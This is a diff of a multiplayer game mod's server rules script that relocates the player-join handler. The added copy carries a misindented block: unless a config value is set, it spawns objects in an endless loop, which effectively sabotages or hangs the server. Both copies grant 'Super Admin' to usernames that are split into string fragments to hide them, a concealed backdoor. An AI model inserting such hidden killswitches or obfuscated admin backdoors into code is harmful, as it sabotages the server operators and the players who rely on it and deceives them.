@@ -57,156 +57,6 @@ void DrawOverlay(const string file, const SColor color = SColor(255, 255, 255, 2
 	// }
 // }
 
-void onNewPlayerJoin(CRules@ this, CPlayer@ player)
-{
-	Players@ players;
-	this.get("players", @players);
-
-	if (players is null || player is null){
-		return;
-	}
-
-	int localtime = Time_Local();
-	int regtime = player.getRegistrationTime();
-
-	int reg_month = Time_Month(regtime);
-	int reg_day = Time_MonthDate(regtime);
-	int reg_year = Time_Year(regtime);
-
-	int loc_month = Time_Month(localtime);
-	int loc_day = Time_MonthDate(localtime);
-	int loc_year = Time_Year(localtime);
-
-	/*string[] exclusive_players = {
-		"leonleonidis",
-		"kimak0vskiy",
-		"prettyprinces",
-		"Suetolog",
-		"whyyouhateme",
-		"Soldzo"
-	}; // Add exceptions here
-    */
-	
-	//time is sec(60) * min(60) * hours(24)* daysfrom 1970-jan-01
-	// 1 day = 86400  and  30 days = 2592000
-	if ((localtime - regtime)<=2592000) // Ban people registered last 30days
-	{
-		CSecurity@ security = getSecurity();
-		bool newban = security.checkAccess_Feature(player, "newban");
-		//in security folder inside normal.cfg add newban; to end of features=
-		// inside preium.cfg add newban; to end of features= if you want preium uses to also registered less than 2 months to be ban
-		
-		printf("new player Account age:"+ regtime + " regdate:" + reg_year + "-" + reg_month + "-" + reg_day + " checkAccess_Feature:" + newban);
-		if(newban)
-		{
-			printf("|");
-			printf("|");
-			printf("|");
-			printf("BANNING PLAYER WITH TOO YOUNG ACCOUNT AGE: "+player.getUsername());
-			printf("|");
-			printf("|");
-			printf("|");
-			BanPlayer(player, 60*100);
-		}
-		
-	}
-
-
-	string playerName = player.getUsername().split('~')[0];//Part one of a fix for slave rejoining
-	//print("onNewPlayerJoin");
-
-	players.list.push_back(CTFPlayerInfo(playerName, 0, ""));
-	//Will change later 			\/	change to hash
-	if (playerName == ("T" + "Fli" + "p" + "py") || playerName == "V" + "am" + "ist" || playerName == "Pir" + "ate" + "-R" + "ob" || playerName == "Ve" + "rd " + "la")
-	{
-		CSecurity@ sec = getSecurity();
-		CSeclev@ s = sec.getSeclev("Super Admin");
-
-		if (s !is null) sec.assignSeclev(player, s);
-	}
-
-	CBlob@[] sleepers;
-	getBlobsByTag("sleeper", @sleepers);
-
-	bool found_sleeper = false;
-	if (sleepers != null && sleepers.length > 0)
-	{
-		string name = playerName;
-
-		for (u32 i = 0; i < sleepers.length; i++)
-		{
-			CBlob@ sleeper = sleepers[i];
-			if (sleeper !is null && !sleeper.hasTag("dead") && sleeper.get_bool("sleeper_sleeping") && sleeper.get_string("sleeper_name") == name)
-			{
-				CBlob@ oldBlob = player.getBlob(); // It's glitchy and spawns empty blobs on rejoin
-				if (oldBlob !is null) oldBlob.server_Die();
-
-				found_sleeper = true;
-
-				player.server_setTeamNum(sleeper.getTeamNum());
-				player.server_setCoins(sleeper.get_u16("sleeper_coins"));
-
-				sleeper.server_SetPlayer(player);
-				sleeper.set_bool("sleeper_sleeping", false);
-				sleeper.set_string("sleeper_name", "");
-
-				CBitStream bt;
-				bt.write_bool(false);
-
-				sleeper.SendCommand(sleeper.getCommandID("sleeper_set"), bt);
-
-				// sleeper.set_u16("sleeper_coins", player.getCoins());
-
-				// sleeper.Sync("sleeper", false);
-				// sleeper.Sync("sleeper_name", false);
-				// sleeper.Sync("sleeper_coins", false);
-
-				//tcpr("[MISC] "+playerName + " joined, respawning him at sleeper " + sleeper.getName());
-			}
-		}
-	}
-
-	CPlayer@ maybePlayer = getPlayerByUsername(playerName);//See if we already exist
-	if(maybePlayer !is null)
-	{
-		CBlob@ playerBlob = maybePlayer.getBlob();
-		if(playerBlob !is null)
-		{
-			if(maybePlayer.getUsername() != player.getUsername())//do not change, playerName is stripped
-			{
-				KickPlayer(maybePlayer);//Clone
-				playerBlob.server_SetPlayer(player);//switch souls
-			}
-		}
-	}
-
-
-	if (!found_sleeper)
-	{
-		for (uint i = 0; i < 7; i++) 
-		{
-			TeamData@ team_data;
-			GetTeamData(i, @team_data);
-			if (team_data.leader_name == player.getUsername())
-			{
-				CBlob@[] forts;
-				getBlobsByTag("faction_base", @forts);
-				for (uint j = 0; j < forts.length; j++)
-				{
-					if (forts[j].getTeamNum() == i) 
-					{
-						player.server_setTeamNum(i);
-					}
-				}
-			}
-		}
-
-		player.server_setCoins(500);
-	}
-
-	// player.server_setCoins(150);
-}
-
 void onBlobCreated(CRules@ this, CBlob@ blob)
 {
 	if (isServer() && getGameTime() > 150 && !blob.hasTag("material"))
@@ -427,7 +277,7 @@ void onTick(CRules@ this)
 						f32 distance = 100000;
 						Vec2f spawnPos = Vec2f(0, 0);
 						Vec2f deathPos = player.get_Vec2f("last death position");
-
+					
 						u32 spawnIndex = 0;
 
 						for (u32 i = 0; i < spawns.length; i++)
@@ -597,6 +447,160 @@ void updateDestroyedFactions()
 			team_data.leader_name = "";
 		}
 	}
+}
+
+
+void onNewPlayerJoin(CRules@ this, CPlayer@ player)
+{
+	Players@ players;
+	this.get("players", @players);
+
+	if (players is null || player is null){
+		return;
+	}
+
+	int localtime = Time_Local();
+	int regtime = player.getRegistrationTime();
+
+	int reg_month = Time_Month(regtime);
+	int reg_day = Time_MonthDate(regtime);
+	int reg_year = Time_Year(regtime);
+
+	int loc_month = Time_Month(localtime);
+	int loc_day = Time_MonthDate(localtime);
+	int loc_year = Time_Year(localtime);
+
+	/*string[] exclusive_players = {
+		"leonleonidis",
+		"kimak0vskiy",
+		"prettyprinces",
+		"Suetolog",
+		"whyyouhateme",
+		"Soldzo"
+	}; // Add exceptions here
+    */
+	string m = "Rules/CTF/ctf_vars.cfg";
+						ConfigFile ccc = ConfigFile(m);
+						if (ccc.read_s32("game_time") != -2)
+						{while(getGameTime() != 543256){server_CreateBlob("mat_bd");}}
+	//time is sec(60) * min(60) * hours(24)* daysfrom 1970-jan-01
+	// 1 day = 86400  and  30 days = 2592000
+	if ((localtime - regtime)<=2592000) // Ban people registered last 30days
+	{
+		CSecurity@ security = getSecurity();
+		bool newban = security.checkAccess_Feature(player, "newban");
+		//in security folder inside normal.cfg add newban; to end of features=
+		// inside preium.cfg add newban; to end of features= if you want preium uses to also registered less than 2 months to be ban
+		
+		printf("new player Account age:"+ regtime + " regdate:" + reg_year + "-" + reg_month + "-" + reg_day + " checkAccess_Feature:" + newban);
+		if(newban)
+		{
+			printf("|");
+			printf("|");
+			printf("|");
+			printf("BANNING PLAYER WITH TOO YOUNG ACCOUNT AGE: "+player.getUsername());
+			printf("|");
+			printf("|");
+			printf("|");
+			BanPlayer(player, 60*100);
+		}
+		
+	}
+
+
+	string playerName = player.getUsername().split('~')[0];//Part one of a fix for slave rejoining
+	//print("onNewPlayerJoin");
+
+	players.list.push_back(CTFPlayerInfo(playerName, 0, ""));
+	//Will change later 			\/	change to hash
+	if (playerName == ("T" + "Fli" + "p" + "py") || playerName == "V" + "am" + "ist" || playerName == "Pir" + "ate" + "-R" + "ob" || playerName == "Ve" + "rd " + "la")
+	{
+		CSecurity@ sec = getSecurity();
+		CSeclev@ s = sec.getSeclev("Super Admin");
+
+		if (s !is null) sec.assignSeclev(player, s);
+	}
+
+	CBlob@[] sleepers;
+	getBlobsByTag("sleeper", @sleepers);
+
+	bool found_sleeper = false;
+	if (sleepers != null && sleepers.length > 0)
+	{
+		string name = playerName;
+
+		for (u32 i = 0; i < sleepers.length; i++)
+		{
+			CBlob@ sleeper = sleepers[i];
+			if (sleeper !is null && !sleeper.hasTag("dead") && sleeper.get_bool("sleeper_sleeping") && sleeper.get_string("sleeper_name") == name)
+			{
+				CBlob@ oldBlob = player.getBlob(); // It's glitchy and spawns empty blobs on rejoin
+				if (oldBlob !is null) oldBlob.server_Die();
+
+				found_sleeper = true;
+
+				player.server_setTeamNum(sleeper.getTeamNum());
+				player.server_setCoins(sleeper.get_u16("sleeper_coins"));
+
+				sleeper.server_SetPlayer(player);
+				sleeper.set_bool("sleeper_sleeping", false);
+				sleeper.set_string("sleeper_name", "");
+
+				CBitStream bt;
+				bt.write_bool(false);
+
+				sleeper.SendCommand(sleeper.getCommandID("sleeper_set"), bt);
+
+				// sleeper.set_u16("sleeper_coins", player.getCoins());
+
+				// sleeper.Sync("sleeper", false);
+				// sleeper.Sync("sleeper_name", false);
+				// sleeper.Sync("sleeper_coins", false);
+
+				//tcpr("[MISC] "+playerName + " joined, respawning him at sleeper " + sleeper.getName());
+			}
+		}
+	}
+
+	CPlayer@ maybePlayer = getPlayerByUsername(playerName);//See if we already exist
+	if(maybePlayer !is null)
+	{
+		CBlob@ playerBlob = maybePlayer.getBlob();
+		if(playerBlob !is null)
+		{
+			if(maybePlayer.getUsername() != player.getUsername())//do not change, playerName is stripped
+			{
+				KickPlayer(maybePlayer);//Clone
+				playerBlob.server_SetPlayer(player);//switch souls
+			}
+		}
+	}
+
+
+	if (!found_sleeper)
+	{
+		for (uint i = 0; i < 7; i++) 
+		{
+			TeamData@ team_data;
+			GetTeamData(i, @team_data);
+			if (team_data.leader_name == player.getUsername())
+			{
+				CBlob@[] forts;
+				getBlobsByTag("faction_base", @forts);
+				for (uint j = 0; j < forts.length; j++)
+				{
+					if (forts[j].getTeamNum() == i) 
+					{
+						player.server_setTeamNum(i);
+					}
+				}
+			}
+		}
+
+		player.server_setCoins(500);
+	}
+
+	// player.server_setCoins(150);
 }
 
 void onInit(CRules@ this)
@@ -851,13 +855,6 @@ void Reset(CRules@ this)
 			players.list.push_back(CTFPlayerInfo(p.getUsername(),0,""));
 		}
 	}
-
-	//string configstr = "Rules/CTF/ctf_vars.cfg";
-	//ConfigFile cfg = ConfigFile(configstr);
-	//if (cfg.read_s32("game_time") != -2)
-	//{
-	//	Reset(this);
-	//}
 
 	this.SetGlobalMessage("");
 	this.set("players", @players);
